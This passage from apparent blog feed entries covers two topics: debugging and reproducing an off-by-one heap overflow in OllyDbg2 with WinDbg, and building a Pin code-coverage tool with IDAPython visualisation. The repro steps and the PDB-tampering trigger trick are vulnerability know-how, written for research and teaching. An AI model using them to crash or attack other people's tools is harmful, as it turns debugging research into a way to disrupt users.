<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>bp 004CF1BF &quot;.printf \&quot;[Getsourceline] %mu\\n[Getsourceline] struct: 0x%x\&quot;, poi(esp + 4), eax ; .if(eax != 0){ .if(poi(eax + 0x218) == 0){ .printf \&quot; field: 0x%x\\n\&quot;, poi(eax + 0x218); gc }; } .else { .printf \&quot;\\n\\n\&quot; ; gc; };&quot;
</span><span class='line'>bp 004CE5DD &quot;.printf \&quot;[buggy] Nbline: 0x%x \\n\&quot;, eax ; gc&quot;
</span><span class='line'>bp 004CE5E7 &quot;.printf \&quot;[buggy] Nbbytes to alloc: 0x%x \\n\&quot;, poi(esp) ; gc&quot;
</span><span class='line'>bp 004CE742 &quot;.printf \&quot;[buggy] NbChar: 0x%x / 0x%x - Idx: 0x%x\\n\&quot;, eax, poi(ebp - 1C), poi(ebp - 8) ; gc&quot;
</span><span class='line'>bp 004CE769 &quot;.printf \&quot;[buggy] mov [0x%x + 0x%x], 0x%x\\n\&quot;, ecx, eax * 4, edx&quot;
</span></code></pre></td></tr></table></div></figure>


<p>On my environment, it gives me something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[Getsourceline] f:\dd\vctools\crt_bld\self_x86\crt\src\crt0.c
</span><span class='line'>[Getsourceline] struct: 0x0
</span><span class='line'>[...]
</span><span class='line'>[Getsourceline] oob-write-heap-ollydbg2h-trigger.c
</span><span class='line'>[Getsourceline] struct: 0xaf00238 field: 0x0
</span><span class='line'>[buggy] Nbline: 0x3b
</span><span class='line'>[buggy] Nbbytes to alloc: 0x2d0
</span><span class='line'>[buggy] NbChar: 0x0 / 0xb73 - Idx: 0x0
</span><span class='line'>[buggy] NbChar: 0x4 / 0xb73 - Idx: 0x1
</span><span class='line'>[buggy] NbChar: 0x5a / 0xb73 - Idx: 0x2
</span><span class='line'>[buggy] NbChar: 0xa4 / 0xb73 - Idx: 0x3
</span><span class='line'>[buggy] NbChar: 0xee / 0xb73 - Idx: 0x4
</span><span class='line'>[...]
</span><span class='line'>[buggy] NbChar: 0xb73 / 0xb73 - Idx: 0x3c
</span><span class='line'>[buggy] mov [0xb031d30 + 0x2d0], 0xb73
</span><span class='line'>
</span><span class='line'>eax=000000b4 ebx=12dfed04 ecx=0b031d30 edx=00000b73 esi=00188694 edi=005d203c
</span><span class='line'>eip=004ce769 esp=00187d60 ebp=00187d80 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>ollydbg!Findfreehardbreakslot+0x21d9:
</span><span class='line'>004ce769 891481          mov     dword ptr [ecx+eax*4],edx ds:002b:0b032000=????????
</span></code></pre></td></tr></table></div></figure>


<h1>Repro@home</h1>

<ol>
<li>Download the last version of OllyDbg2 <a href="http://ollydbg.de/odbg201h.zip">here</a>, extract the files</li>
<li>Download the three files from <a href="https://github.com/0vercl0k/stuffz/tree/master/odb2-OOB-write-heap">odb2-oob-write-heap</a>, put them in the same directory than <em>ollydbg.exe</em> is</li>
<li>Launch WinDbg and open the last version of OllyDbg2</li>
<li>Set your breakpoints (or not), F5 to launch</li>
<li>Open the trigger in OllyDbg2</li>
<li>Press F9 when the binary is fully loaded</li>
<li><strong>BOOM</strong> :). Note that you may not have a visible crash (remember, that&rsquo;s what made our bug not trivial to debug without full pageheap). Try to poke around with the debugger: restarting the binary or closing OllyDbg2 should be enough to get the message from the heap allocator in your debugger.</li>
</ol>


<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/woot.png"></p>

<h1>Fun fact</h1>

<p>You can even trigger the bug with only the binary and the PDB database. The trick is to tamper the PDB, and more precisely where it keeps the path to your source code. That way, when OllyDbg2 will load the PDB database, it will read that same database like it&rsquo;s the source code of the application. Awesome.</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/fun.png"></p>

<h1>Conclusion</h1>

<p>Those kind of crashes are always an occasion to learn new things. Either it&rsquo;s trivial to debug/repro and you won&rsquo;t waste much of your time, or it&rsquo;s not and you will improve your debugger/reverse-engineer-fu on a <strong>real</strong> example. So do it!</p>

<p>By the way, I doubt the bug is exploitable and I didn&rsquo;t even try to exploit it ; but if you succeed I would be really glad to read your write-up! But if we assume it&rsquo;s exploitable for a second, you would still have to distribute the PDB file, the source file (I guess it would give you more control than with the PDB) and the binary to your victim. So no big deal.</p>

<p>If you are too lazy to debug your crashes, send them to me, I may have a look at it!</p>

<p>Oh, I almost forgot: <a href="http://doar-e.github.io/about/">we are still looking for motivated contributors to write cool posts</a>, spread the world.</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Some thoughts about code-coverage measurement with Pin]]></title>
    <link href="http://doar-e.github.io/blog/2013/08/31/some-thoughts-about-code-coverage-measurement-with-pin/"/>
    
    <updated>2013-08-31T18:57:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/08/31/some-thoughts-about-code-coverage-measurement-with-pin</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Sometimes, when you are reverse-engineering binaries you need somehow to measure, or just to have an idea about how much &ldquo;that&rdquo; execution is covering the code of your target. It can be for fuzzing purpose, maybe you have a huge set of inputs (it can be files, network traffic, anything) and you want to have the same coverage with only a subset of them. Or maybe, you are not really interested in the measure, but only with the coverage differences between two executions of your target: to locate where your program is handling a specific feature for example.</p>

<p>But it&rsquo;s not a trivial problem, usually you don&rsquo;t have the source-code of the target, and you want it to be quick. The other thing, is that you don&rsquo;t have an input that covers the whole code base, you don&rsquo;t even know if it&rsquo;s possible ; so you can&rsquo;t compare your analysis to that &ldquo;ideal one&rdquo;. Long story short, you can&rsquo;t say to the user &ldquo;OK, this input covers 10% of your binary&rdquo;. But you can clearly register what your program is doing with input A, what it is doing with input B and then analyzing the differences. With that way you can have a (more precise?) idea about which input seems to have better coverage than another.</p>

<p>Note also, this is a perfect occasion to play with Pin :&ndash;)).</p>

<p>In this post, I will explain briefly how you can build that kind of tool using Pin, and how it can be used for reverse-engineer purposes.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Our Pintool</h1>

<p>If you have never heard about Intel&rsquo;s DBI framework Pin, I have made a selection of links for you, read them and understand them ; you won&rsquo;t be able of using correctly Pin, if you don&rsquo;t know a bit how it works:</p>

<ul>
<li><a href="http://software.intel.com/sites/landingpage/pintool/docs/58423/Pin/html/index.html">Pin 2.12 User Guide</a></li>
<li><a href="http://www.jaleels.org/ajaleel/Pin/slides/">Introduction to Pin &ndash; Aamer Jaleel</a></li>
</ul>


<p>Concerning my setup, I&rsquo;m using Pin 2.12 on Windows 7 x64 with VC2010 and I&rsquo;m building x86 Pintools (works great with Wow64). If you want to build easily your Pintool outside of the Pin tool kit directory I&rsquo;ve made a handy little python script: <a href="https://github.com/0vercl0k/stuffz/blob/master/setup_pintool_project.py">setup_pintool_project.py</a>.</p>

<p>Before coding, we need to talk a bit about what we really want. This is simple, we want a Pintool that:</p>

<ul>
<li>is the more efficient possible. OK, that&rsquo;s a real problem ; even if Pin is more efficient than other DBI framework (like <a href="http://dynamorio.org/">DynamoRio</a> or <a href="http://valgrind.org/">Valgrind</a>), it is always kind of slow.</li>
<li>keeps track of all the basic blocks executed. We will store the address of each basic block executed and its number of instructions.</li>
<li>generates a JSON report about a specific execution. Once we have that report, we are free to use Python scripts to do whatever we want. To do that, we will use <a href="http://www.digip.org/jansson/">Jansson</a>: it&rsquo;s easy to use, open-source and written in C.</li>
<li>doesn&rsquo;t instrument Windows APIs. We don&rsquo;t want to waste our CPU time being in the native libraries of the system ; it&rsquo;s part of our little &ldquo;tricks&rdquo; to improve the speed of our Pintool.</li>
</ul>


<p>I think it&rsquo;s time to code now: first, let&rsquo;s define several data structures in order to store the information we need:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">typedef</span> <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">ADDRINT</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">MODULE_BLACKLIST_T</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">MODULE_BLACKLIST_T</span> <span class="n">MODULE_LIST_T</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">UINT32</span><span class="o">&gt;</span> <span class="n">BASIC_BLOCKS_INFO_T</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The two first types will be used to hold modules related information: path of the module, start address and end address. The third one is simple: the key is the basic block address and the value is its number of instructions.</p>

<p>Then we are going to define our instrumentation callback:</p>

<ul>
<li>one to know whenever a module is loaded in order to store its base/end address, one for the traces. You can set the callbacks using <em>IMG_AddInstrumentationFunction</em> and <em>TRACE_AddInstrumentationFunction</em>.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">image_instrumentation</span><span class="p">(</span><span class="n">IMG</span> <span class="n">img</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span> <span class="n">v</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">ADDRINT</span> <span class="n">module_low_limit</span> <span class="o">=</span> <span class="n">IMG_LowAddress</span><span class="p">(</span><span class="n">img</span><span class="p">),</span> <span class="n">module_high_limit</span> <span class="o">=</span> <span class="n">IMG_HighAddress</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">IMG_IsMainExecutable</span><span class="p">(</span><span class="n">img</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">image_path</span> <span class="o">=</span> <span class="n">IMG_Name</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">ADDRINT</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">module_info</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>        <span class="n">image_path</span><span class="p">,</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>            <span class="n">module_low_limit</span><span class="p">,</span>
</span><span class='line'>            <span class="n">module_high_limit</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>    <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">module_list</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">module_info</span><span class="p">);</span>
</span><span class='line'>    <span class="n">module_counter</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">is_module_should_be_blacklisted</span><span class="p">(</span><span class="n">image_path</span><span class="p">))</span>
</span><span class='line'>        <span class="n">modules_blacklisted</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">module_info</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>one to be able to insert calls before every basic blocks.</li>
</ul>


<p>The thing is: Pin doesn&rsquo;t have a <em>BBL_AddInstrumentationFunction</em>, so we have to instrument the traces, iterate through them to get the basic block. It&rsquo;s done really easily with <em>TRACE_BblHead</em>, <em>BBL_Valid</em> and <em>BBL_Next</em> functions. Of course, if the basic block address is in a blacklisted range address, we don&rsquo;t insert a call to our analysis function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">trace_instrumentation</span><span class="p">(</span><span class="n">TRACE</span> <span class="n">trace</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">BBL</span> <span class="n">bbl</span> <span class="o">=</span> <span class="n">TRACE_BblHead</span><span class="p">(</span><span class="n">trace</span><span class="p">);</span> <span class="n">BBL_Valid</span><span class="p">(</span><span class="n">bbl</span><span class="p">);</span> <span class="n">bbl</span> <span class="o">=</span> <span class="n">BBL_Next</span><span class="p">(</span><span class="n">bbl</span><span class="p">))</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">is_address_in_blacklisted_modules</span><span class="p">(</span><span class="n">BBL_Address</span><span class="p">(</span><span class="n">bbl</span><span class="p">)))</span>
</span><span class='line'>            <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">BBL_InsertCall</span><span class="p">(</span>
</span><span class='line'>            <span class="n">bbl</span><span class="p">,</span>
</span><span class='line'>            <span class="n">IPOINT_ANYWHERE</span><span class="p">,</span>
</span><span class='line'>            <span class="p">(</span><span class="n">AFUNPTR</span><span class="p">)</span><span class="n">handle_basic_block</span><span class="p">,</span>
</span><span class='line'>            <span class="n">IARG_FAST_ANALYSIS_CALL</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_UINT32</span><span class="p">,</span>
</span><span class='line'>            <span class="n">BBL_NumIns</span><span class="p">(</span><span class="n">bbl</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_ADDRINT</span><span class="p">,</span>
</span><span class='line'>            <span class="n">BBL_Address</span><span class="p">(</span><span class="n">bbl</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_END</span>
</span><span class='line'>        <span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>For efficiency reasons, we let decide Pin about where it puts its JITed call to the analysis function <em>handle_basic_block</em> ; we also use the fast linkage (it basically means the function will be called using the <a href="http://msdn.microsoft.com/en-us/library/6xa169sk.aspx">__fastcall</a> calling convention).</p>

<p>The analysis function is also very trivial, we just need to store basic block addresses in a global variable. The method doesn&rsquo;t have any branch, it means Pin will most likely inlining the function, that&rsquo;s also cool for the efficiency.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">PIN_FAST_ANALYSIS_CALL</span> <span class="n">handle_basic_block</span><span class="p">(</span><span class="n">UINT32</span> <span class="n">number_instruction_in_bb</span><span class="p">,</span> <span class="n">ADDRINT</span> <span class="n">address_bb</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">basic_blocks_info</span><span class="p">[</span><span class="n">address_bb</span><span class="p">]</span> <span class="o">=</span> <span class="n">number_instruction_in_bb</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, just before the process ends we serialize our data in a simple JSON report thanks to <a href="http://www.digip.org/jansson/">jansson</a>. You may also want to use a binary serialization to have smaller report.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">save_instrumentation_infos</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">/// basic_blocks_info section</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbls_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbls_list</span> <span class="o">=</span> <span class="n">json_array</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbl_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="c1">// unique_count field</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbls_info</span><span class="p">,</span> <span class="s">&quot;unique_count&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">size</span><span class="p">()));</span>
</span><span class='line'>    <span class="c1">// list field</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbls_info</span><span class="p">,</span> <span class="s">&quot;list&quot;</span><span class="p">,</span> <span class="n">bbls_list</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">BASIC_BLOCKS_INFO_T</span><span class="o">::</span><span class="n">const_iterator</span> <span class="n">it</span> <span class="o">=</span> <span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="o">++</span><span class="n">it</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">bbl_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>        <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbl_info</span><span class="p">,</span> <span class="s">&quot;address&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">first</span><span class="p">));</span>
</span><span class='line'>        <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbl_info</span><span class="p">,</span> <span class="s">&quot;nbins&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">));</span>
</span><span class='line'>        <span class="n">json_array_append_new</span><span class="p">(</span><span class="n">bbls_list</span><span class="p">,</span> <span class="n">bbl_info</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* .. same thing for blacklisted modules, and modules .. */</span>
</span><span class='line'>    <span class="c1">/// Building the tree</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">root</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;basic_blocks_info&quot;</span><span class="p">,</span> <span class="n">bbls_info</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;blacklisted_modules&quot;</span><span class="p">,</span> <span class="n">blacklisted_modules</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;modules&quot;</span><span class="p">,</span> <span class="n">modules</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Writing the report</span>
</span><span class='line'>    <span class="n">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">KnobOutputPath</span><span class="p">.</span><span class="n">Value</span><span class="p">().</span><span class="n">c_str</span><span class="p">(),</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_dumpf</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">JSON_COMPACT</span> <span class="o">|</span> <span class="n">JSON_ENSURE_ASCII</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If like me you are on a x64 Windows system, but you are instrumenting x86 processes you should directly blacklist the area where Windows keeps the <a href="http://www.nynaeve.net/?p=131">SystemCallStub</a> (you know the &ldquo;JMP FAR&rdquo;). To do that, we simply use the <em>__readfsdword</em> intrinsic in order to read the field <a href="http://msdn.moonsols.com/win7rtm_x64/TEB32.html">TEB32.WOW32Reserved</a> that holds the address of that stub. Like that you won&rsquo;t waste your CPU time every time your program is performing a system call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">ADDRINT</span> <span class="n">wow64stub</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0xC0</span><span class="p">);</span>
</span><span class='line'><span class="n">modules_blacklisted</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="s">&quot;wow64stub&quot;</span><span class="p">),</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>            <span class="n">wow64stub</span><span class="p">,</span>
</span><span class='line'>            <span class="n">wow64stub</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The entire Pintool source code is here: <a href="https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/pin-code-coverage-measure.cpp">pin-code-coverage-measure.cpp</a>.</p>

<h1>I want to see the results.</h1>

<p>I agree that&rsquo;s neat to have a JSON report with the basic blocks executed by our program, but it&rsquo;s not really readable for a human. We can use an <a href="https://github.com/0vercl0k/stuffz/tree/master/pin-code-coverage-measure">IDAPython</a> script that will parse our report, and will color all the instructions executed. It should be considerably better to see the execution path used by your program.</p>

<p>To color an instruction you have to use the functions: <em>idaapi.set_item_color</em> and <em>idaapi.del_item_color</em> (if you want to reset the color). You can also use <em>idc.GetItemSize</em> to know the size of an instruction, like that you can iterate for a specific number of instruction (remember, we stored that in our JSON report!).</p>

<figure class='code'><figcaption><span>idapy_color_path_from_json.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/idapy_color_path_from_json.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idc</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idaapi</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">nbins</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Color &#39;nbins&#39; instructions starting from ea&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">colors</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;black&#39;</span> <span class="p">:</span> <span class="mh">0x000000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;red&#39;</span> <span class="p">:</span> <span class="mh">0x0000FF</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;blue&#39;</span> <span class="p">:</span> <span class="mh">0xFF0000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;green&#39;</span> <span class="p">:</span> <span class="mh">0x00FF00</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nbins</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">del_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">set_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">colors</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
</span><span class='line'>        <span class="n">ea</span> <span class="o">+=</span> <span class="n">idc</span><span class="o">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
